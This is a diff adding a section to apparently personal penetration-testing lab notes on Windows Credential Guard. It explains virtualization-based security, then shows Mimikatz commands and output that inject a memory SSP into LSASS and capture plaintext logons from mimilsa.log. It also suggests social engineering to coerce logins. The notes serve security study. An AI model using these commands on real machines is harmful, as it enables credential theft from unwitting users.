@@ -556,6 +556,155 @@ d41y@htb[/htb]$ sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share
 64f12cddaa88057e06a81b54e73b949b:Password1
 ```
 
+#### Windows Credential Guard
+
+When Windows Credential Guard is enabled, the LSASS environment runs as a trustlet in VTL1 named LSAISO.exe (_LSA Isolated_) and communicates with the LSASS.exe proces running in VTL0 through an RPC channel.
+
+> [!INFO]
+> Virtualization-based Security (_VBS_) is a software technology which takes advantage of the hardware virtualization features that modern CPUs provide. These features can be used to, among other things, create and isolate secure regions of memory which become the root of trust of the OS.
+> 
+> VBS runs a hypervisor on the physical hardware rather than running on the OS. A hypervisor is a software component that uses hardware virtualization features provided by the CPU in order to create and manage virtual machines.
+> 
+> Specifically, VBS is implemented through Hyper-V, Microsoft's native hypervisor. In addition, Microsoft built the Virtual Secure Mode which is a set of hypervisor capabilities offered to the Hyper-V partitions.
+> 
+> VSM maintains this isolation through what is known as Virtual Trust Levels. Each VTL represents a separate isolated memory region and currently Microsoft supports up to 16 levels, ranked from least privileged, VTL0, to VTL1, with VTL1 having more privileges than VTL0 and so on.
+> 
+> **VTL0 (_VSM Normal Mode_)**: Contains the Windows environment that hosts regular user-mode processes as well as a normal kernel and kernel-mode data.
+> **VTL1 (_VSM Secure Mode_)**: Contains an isolated Windows environment used for critical functionalities.
+> 
+> The user-mode in VTL1 is known as Isolated User-Mode, which consists of IUM processes known as Trusted Processes, Secure Processes, or Trustlets.
+> 
+> Microsoft has used VSM as a base for several mitigations including Device Guard, virtual TPMs and Credentia Guard.
+> 
+> These security features premiered with Windows 10 and Windows Server 2016; however, they were not enabled by default. Because of this, the vast majority of machines encountered in an enterprise environment do not have them enabled. With the recent pivot from Microsoft to prioritize security above all these security mitigations are enabled by default on modern Windows installations.
+
+Mimikatz can peruse the memory of the LSASS process and retrieve cached hashes, credentials and information. With the new process running in , all the cached hashes and credential information is stored here, rather than in the memory of the LSASS process, meaning you can't access it.
+
+See what happens when trying to dump all available credentials using Mimikatz on a machine which has Credential Guard enabled. To start off you want to confirm that Credential Guard is running:
+
+```powershell
+PS C:\Users\offsec> Get-ComputerInfo
+
+WindowsBuildLabEx                                       : 22621.1.amd64fre.ni_release.220506-1250
+WindowsCurrentVersion                                   : 6.3
+WindowsEditionId                                        : Enterprise
+...
+HyperVisorPresent                                       : True
+HyperVRequirementDataExecutionPreventionAvailable       :
+HyperVRequirementSecondLevelAddressTranslation          :
+HyperVRequirementVirtualizationFirmwareEnabled          :
+HyperVRequirementVMMonitorModeExtensions                :
+DeviceGuardSmartStatus                                  : Off
+DeviceGuardRequiredSecurityProperties                   : {BaseVirtualizationSupport, SecureBoot}
+DeviceGuardAvailableSecurityProperties                  : {BaseVirtualizationSupport, SecureBoot, DMAProtection, SecureMemoryOverwrite...}
+DeviceGuardSecurityServicesConfigured                   : {CredentialGuard, HypervisorEnforcedCodeIntegrity, 3}
+DeviceGuardSecurityServicesRunning                      : {CredentialGuard, HypervisorEnforcedCodeIntegrity}
+DeviceGuardCodeIntegrityPolicyEnforcementStatus         : EnforcementMode
+DeviceGuardUserModeCodeIntegrityPolicyEnforcementStatus : AuditMode
+```
+
+As you can see from the above output, one of the mitigations enabled under `DeviceGuardSecurityServicesRunning` is `CredentialGuard`.
+
+Dumping all the available credentials with Mimikatz using `sekurlsa::logonpasswords`:
+
+```powershell
+PS C:\Users\offsec> cd C:\tools\mimikatz\
+PS C:\tools\mimikatz> .\mimikatz.exe
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Oct 20 2023 07:20:39
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # sekurlsa::logonpasswords
+...
+Authentication Id : 0 ; 4214404 (00000000:00404e84)
+Session           : RemoteInteractive from 4
+User Name         : Administrator
+Domain            : CORP
+Logon Server      : SERVERWK248
+Logon Time        : 9/19/2024 4:39:07 AM
+SID               : S-1-5-21-1711441587-1152167230-1972296030-500
+        msv :
+         [00000003] Primary
+         * Username : Administrator
+         * Domain   : CORP
+           * LSA Isolated Data: NtlmHash
+             KdfContext: 7862d5bf49e0d0acee2bfb233e6e5ca6456cd38d5bbd5cc04588fbd24010dd54
+             Tag       : 04fe7ed60e46f7cc13c6c5951eb8db91
+             AuthData  : 0100000000000000000000000000000001000000340000004e746c6d48617368
+             Encrypted : 6ad536994213cea0d0b4ff783b8eeb51e5a156e058a36e9dfa8811396e15555d40546e8e1941cbfc32e8905ff705181214f8ec5c
+         * DPAPI    : 8218a675635dab5b43dca6ba9df6fb7e
+        tspkg :
+        wdigest :       KO
+        kerberos :
+         * Username : Administrator
+         * Domain   : CORP.COM
+         * Password : (null)
+        ssp :
+        credman :
+        cloudap :
+...
+```
+
+The output shows that while you know the Administrator user has logged into this box, you can't obtain the cached hashes because the LSASS process only has access to this information after it has been encrypted by the LSAISO process.
+
+> [!INFO]
+> It is important to note that Credential Guard is only designed to protect non-local users. This means that you are still able to obtain NTLM hashes for the local users on this machine.
+
+In order to overcome this mitigation you have to take a different approach. Given that you can't retrieve caches hashes and credentials, you must change your focus. Instead of trying to get this information after a user has already logged into the box, you could attempt to intercept the credentials while a user is logging in.
+
+Microsoft provides quite a few authentication mechanisms as part of the Windows OS such as LSA (_Local Security Authentication_) Authentication, Winlogon, SSPI (_Security Support Provider Interfaces_), etc.
+
+Specifically, SSPI is foundational as it is used by all applications and services that require authentication. For example, when two Windows computers or devices need to be authenticated in order to securely communicate, the requests made for authentication are routed to the SSPI which then handles the actual authentication.
+
+By default, Windows provides several SSP such as Kerberos Security Support Provider, NTLM Security Support Provider, etc. These are incorporated into the SSPI as DLLs and when authentication happens the SSPI decides which one to use.
+
+You can register multiple SSPs through the `AddSecurityPackage` API.
+
+Additionally the SSP can also be registered through the `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa\Security Packages` registry key. Each time the system starts up, the LSASS.exe loads the SSP DLLs present in the list pointed to by the registry key.
+
+What this means is that if you were to develop your own SSP and register it with LSASS, you could maybe force the SSPI to use your malicious SSP DLL for authentication.
+
+Fortunately, Mimikatz already supports this through the `memssp`, which not only provides the required SSP functionality but injects it directly into the memory of the LSASS.exe process without dropping any DLLs on disk.
+
+The Mimikatz SSP takes advantage of the fact that a SSP is called with plaintext credentials through the SSPI allowing you to intercept them directly without needing to resort to a hash.
+
+```
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # misc::memssp
+Injected =)
+```
+
+The output shows that the SSP has been injected.
+
+At this point, you have two options, you can either be patient and wait for another user to remotely connect to the machine or you can resort to additional techniques such as social engineering to coerce someone to log in.
+
+When injecting a SSP into LSASS using Mimikatz, the credentials will be saved in a log file, `C:\Windows\System32\mimilsa.log`.
+
+```powershell
+PS C:\Users\offsec> type C:\Windows\System32\mimilsa.log
+[00000000:00aeb773] CORP\CLIENTWK245$   R3;^LTW*0g4o%bQo1M[L=OCDDR>%$ >n*>&8?!5oz$mY%HV%gm=X&J6,w(FV[KL?*g2HbL.@p(s&mC?Nz*N;DVtP+G]imZ_6MBkb:#Wq&8eo/fU@eBq+;CXt
+[00000000:00aebd86] CORP\CLIENTWK245$   R3;^LTW*0g4o%bQo1M[L=OCDDR>%$ >n*>&8?!5oz$mY%HV%gm=X&J6,w(FV[KL?*g2HbL.@p(s&mC?Nz*N;DVtP+G]imZ_6MBkb:#Wq&8eo/fU@eBq+;CXt
+[00000000:00aebf6f] CORP\CLIENTWK245$   R3;^LTW*0g4o%bQo1M[L=OCDDR>%$ >n*>&8?!5oz$mY%HV%gm=X&J6,w(FV[KL?*g2HbL.@p(s&mC?Nz*N;DVtP+G]imZ_6MBkb:#Wq&8eo/fU@eBq+;CXt
+[00000000:00af2311] CORP\Administrator  QWERTY123!@#
+[00000000:00404e84] CORP\Administrator  Šd
+[00000000:00b16d69] CORP\CLIENTWK245$   R3;^LTW*0g4o%bQo1M[L=OCDDR>%$ >n*>&8?!5oz$mY%HV%gm=X&J6,w(FV[KL?*g2HbL.@p(s&mC?Nz*N;DVtP+G]imZ_6MBkb:#Wq&8eo/fU@eBq+;CXt
+[00000000:00b174fa] CORP\CLIENTWK245$   R3;^LTW*0g4o%bQo1M[L=OCDDR>%$ >n*>&8?!5oz$mY%HV%gm=X&J6,w(FV[KL?*g2HbL.@p(s&mC?Nz*N;DVtP+G]imZ_6MBkb:#Wq&8eo/fU@eBq+;CXt
+[00000000:00b177a7] CORP\CLIENTWK245$   R3;^LTW*0g4o%bQo1M[L=OCDDR>%$ >n*>&8?!5oz$mY%HV%gm=X&J6,w(FV[KL?*g2HbL.@p(s&mC?Nz*N;DVtP+G]imZ_6MBkb:#Wq&8eo/fU@eBq+;CXt
+[00000000:00b1dd77] CLIENTWK245\offsec  lab
+[00000000:00b1de21] CLIENTWK245\offsec  lab
+```
+
+The file contents indicate that you were able to successfully capture the plaintext credentials for the CORP\Administrator user.
+
 ### Attacking Windows Credential Manager
 
 Credential Manager is a feature built into Windows Server 2008 R2 and Windows 7. Thorough documentation on how it works is not publicly available, but essentially, it allows users and applications to securely store credentials relevant to other systems and websites. Credentials are stored in special encrypted folders on the computer under the user and system profiles:
